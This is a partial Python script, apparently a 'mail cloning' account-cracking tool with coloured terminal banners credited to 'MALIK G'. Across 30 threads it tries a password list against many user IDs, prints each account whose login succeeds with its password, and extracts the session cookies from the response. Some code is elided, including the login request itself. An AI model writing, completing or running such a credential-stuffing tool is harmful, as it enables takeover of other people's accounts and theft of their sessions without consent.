...
\x1b[1;31m═══════════════════════════════════════════════════
{WHITE}[•] AUTHOR       : MALIK G 
[•] VERSION      : {RED}0.6
{WHITE}[•] STATUS       : FREE 
\x1b[1;31m═══════════════════════════════════════════════════{WHITE}""")
def linex():
    print('\x1b[1;31m═══════════════════════════════════════════════════\033[1;97m')
def clear():
        os.system('clear')
        print(logo)
loop=0
...
def gmail():
                ...
                with tred(max_workers=30) as Aking:
                        total = str(len(fo))
                        clear()
                        print('\033[1;37m \x1b[38;5;208m[•] TOTAL ACCOUNT : \033[1;32m'+total)
                        print("\033[1;37m \x1b[38;5;208m[•] METHOD : MAIL CLONING\033[1;37m")
                        print("\033[1;37m \x1b[38;5;208m[•] USE AIRPLANE MOOD FOR SPEED 💥\033[1;37m")
                        linex()
                        for user in fo:
                                ids,names = user.split('|')
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [MALIK-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("\r\r\033[1;33m [🍪]\033[95;1m "+coki)
